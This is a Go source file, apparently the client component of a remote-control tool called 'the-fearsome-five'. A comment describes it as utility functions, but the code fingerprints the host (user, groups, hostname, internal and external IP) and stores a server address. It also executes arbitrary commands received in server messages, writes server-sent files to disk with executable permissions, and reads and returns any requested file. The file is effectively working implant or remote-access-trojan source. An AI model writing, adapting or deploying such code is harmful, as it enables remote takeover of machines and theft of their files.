package main

/*
A namespace for cross-platform utility functions,
like getting a username or file path.
*/

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"unsafe"

	"github.com/lithammer/shortuuid/v3"
	"github.com/mattn/go-shellwords"
	"github.com/mikeflynn/the-fearsome-five/shared"
)

type System struct {
	ClientVersion string `json:"client_version"`
	UUID          string `json:"uuid"`
	OS            string `json:"os"`
	OSVersion     string `json:"os_version"`
	Hostname      string `json:"hostname"`
	LanIP         string `json:"ip_internal"`
	ExtIP         string `json:"ip_external"`
	User          string `json:"user"`
	Groups        string `json:"groups"`
	workDir       string `json:"-"`
	unsafe        bool   `json:"-"`
	Server        string `json:"server"`
	connectRetry  int    `json:"-"`
}

func InitSystem(configReset bool, server string, workDir string, unsafe bool, retryDelay int) *System {
	sys := &System{
		ClientVersion: VERSION,
		UUID:          "",
		OS:            runtime.GOOS,
		Groups:        "",
		workDir:       workDir,
		Server:        server,
		unsafe:        unsafe,
		connectRetry:  retryDelay,
	}

	if configReset {
		sys.saveConfig()
	} else {
		if err := sys.loadConfig(); err != nil {
			if err := sys.saveConfig(); err != nil {
				Debug(err.Error())
			}
		}
	}

	sys.GetHostname()
	sys.GetOSVersion()
	sys.GetUser()
	sys.GetUserGroups()

	return sys
}

func (sys *System) saveConfig() error {
	config := map[string]interface{}{
		"uuid":          sys.UUID,
		"work_dir":      sys.workDir,
		"unsafe":        sys.unsafe,
		"server":        sys.Server,
		"connect_retry": sys.connectRetry,
	}

	file, err := os.OpenFile(sys.workDir+"tff.config", os.O_CREATE|os.O_RDWR, os.ModePerm)
	if err != nil {
		return err
	}

	defer file.Close()

	encoder := json.NewEncoder(file)
	if err := encoder.Encode(config); err != nil {
		return err
	}

	return nil
}

func (sys *System) delConfig() error {
	if err := os.Remove(sys.workDir + "tff.config"); err != nil {
		return err
	}

	return nil
}

func (sys *System) loadConfig() error {
	file, err := os.Open(sys.workDir + "tff.config")
	if err != nil {
		return err
	}

	defer file.Close()

	config := map[string]interface{}{}
	jdata, err := ioutil.ReadAll(file)

	if err := json.Unmarshal(jdata, &config); err != nil {
		return err
	}

	if v, k := config["uuid"]; k && v != "" && sys.UUID != v {
		if vt, ok := v.(string); ok {
			sys.UUID = vt
		} else {
			return errors.New("Config param uuid unreadable.")
		}
	}

	if v, k := config["work_dir"]; k && v != "" && sys.workDir != v {
		if vt, ok := v.(string); ok {
			sys.workDir = vt
		} else {
			return errors.New("Config param work_dir unreadable.")
		}
	}

	if v, k := config["unsafe"]; k && v != "" && sys.unsafe != v {
		if vt, ok := v.(bool); ok {
			sys.unsafe = vt
		} else {
			return errors.New("Config param unsafe unreadable.")
		}
	}

	if v, k := config["server"]; k && v != "" && sys.Server != v {
		if vt, ok := v.(string); ok {
			sys.Server = vt
		} else {
			return errors.New("Config param server unreadable.")
		}
	}

	if v, k := config["connect_retry"]; k && v != "" && sys.connectRetry != v {
		if vt, ok := v.(int); ok {
			sys.connectRetry = vt
		} else {
			return errors.New("Config param connect_retry unreadable.")
		}
	}

	return nil
}

func (sys *System) toJSON() []byte {
	ret, _ := json.Marshal(sys)
	return ret
}

func (sys *System) GetUser() (string, error) {
	if sys.User == "" {
		u, err := user.Current()
		if err != nil {
			return "", err
		}

		sys.User = u.Username
	}

	return sys.User, nil
}

func (sys *System) GetUserGroups() (string, error) {
	if len(sys.Groups) < 1 {
		u, err := user.Current()
		if err != nil {
			return "", err
		}

		gids, err := u.GroupIds()
		if err != nil {
			return "", err
		}

		tmp := []string{}
		for _, gid := range gids {
			g, err := user.LookupGroupId(gid)

			if err == nil {
				tmp = append(tmp, g.Name)
			}
		}

		sys.Groups = strings.Join(tmp, ",")
	}

	return sys.Groups, nil
}

func (sys *System) GetInternalIP() (string, error) {
	if sys.LanIP == "" {
		conn, err := net.Dial("udp", "8.8.8.8:80")
		if err != nil {
			return "", err
		}

		defer conn.Close()

		localAddr := conn.LocalAddr().(*net.UDPAddr)

		sys.LanIP = localAddr.IP.String()
	}

	return sys.LanIP, nil
}

func (sys *System) GetExternalIP(reload bool) (string, error) {
	if reload || sys.ExtIP == "" {
		resp, err := http.Get("http://checkip.amazonaws.com/")
		if err != nil {
			return "", err
		}

		defer resp.Body.Close()

		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}

		sys.ExtIP = strings.TrimSpace(string(data))
	}

	return sys.ExtIP, nil
}

func (sys *System) GetOSVersion() (string, error) {
	if sys.OSVersion == "" {
		switch sys.OS {
		case "darwin":
			out, err := exec.Command("defaults", "read", "loginwindow", "SystemVersionStampAsString").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		case "windows":
			out, err := exec.Command("ver").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		case "linux":
			out, err := exec.Command("uname", "-r").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		default:
			return "", errors.New("Unsupported OS.")
		}
	}

	return sys.OSVersion, nil
}

func (sys *System) GetHostname() (string, error) {
	if sys.Hostname == "" {
		if val, err := os.Hostname(); err == nil {
			sys.Hostname = val
		} else {
			return "", err
		}
	}

	return sys.Hostname, nil
}

func (sys *System) RunCommand(message *shared.Message) (string, error) {
	var cmd *exec.Cmd

	args, err := shellwords.Parse(string(message.Body))
	if err != nil {
		return "", err
	}

	cmd = exec.Command(args[0], args[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	if unsafe.Sizeof(out) > uintptr(shared.MaxMessageSize) {
		return "", errors.New("Output too large for return message.")
	}

	return string(out), nil
}

func (sys *System) SaveFile(msg *shared.Message) (string, error) {
	// Did they request a filepath?
	path := sys.workDir
	if v, err := msg.GetMeta("filepath"); err == nil {
		path = v
	}

	// Inspect the target path
	if strings.HasSuffix(path, "/") {
		path = path + shortuuid.New()
	} else if strings.HasPrefix(path, "/") {
		path = sys.workDir + path
	}

	if _, err := os.Stat(filepath.Dir(path)); err != nil {
		return "", err
	}

	// Save the file
	err := ioutil.WriteFile(path, msg.Body, 0744)
	if err != nil {
		return "", err
	}

	return path, nil
}

func (sys *System) SendFile(msg *shared.Message) ([]byte, error) {
	filepath := string(msg.Body)

	if _, err := os.Stat(filepath); err == nil {
		file, err := os.Open(filepath)
		if err != nil {
			return []byte{}, errors.New("Can't read file.")
		}

		buf := bytes.NewBuffer(nil)

		if _, err := io.Copy(buf, file); err != nil {
			return []byte{}, errors.New("Can't copy file.")
		}

		return []byte(buf.Bytes()), nil
	} else {
		return []byte{}, errors.New("File not found.")
	}
}
